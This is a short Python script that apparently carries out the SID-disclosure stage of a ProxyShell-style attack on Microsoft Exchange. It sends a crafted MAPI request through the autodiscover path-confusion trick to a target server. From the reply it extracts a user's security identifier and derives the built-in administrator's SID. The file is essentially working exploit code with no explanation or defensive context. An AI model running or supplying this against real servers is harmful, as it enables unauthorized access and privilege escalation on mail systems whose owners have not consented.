import requests

base_url = "https://10.0.102.210"
headers = {}
cookies = {}
proxies = {"https": "http://127.0.0.1:8080"}
headers[
    "User-Agent"
] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

data = "/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh"
data += "\x00\x00\x00\x00\x00\xe4\x04"
data += "\x00\x00\x09\x04\x00\x00\x09"
data += "\x04\x00\x00\x00\x00\x00\x00"

headers = {
    "X-RequestType": "Connect",
    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
    "Content-Type": "application/mapi-http",
}

r = requests.post(
    base_url
    + "/autodiscover/autodiscover.json?@evil.corp/mapi/emsmdb?&Email=autodiscover/autodiscover.json?@evil.corp",
    data=data,
    headers=headers,
    verify=False,
    proxies=proxies,
)

# print(r.text)
sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
admin_sid = ""
if sid.rsplit("-", 1)[1] != "500":
    admin_sid = sid.rsplit("-", 1)[0] + "-500"
else:
    admin_sid = sid
print("[+] SID: ", admin_sid)
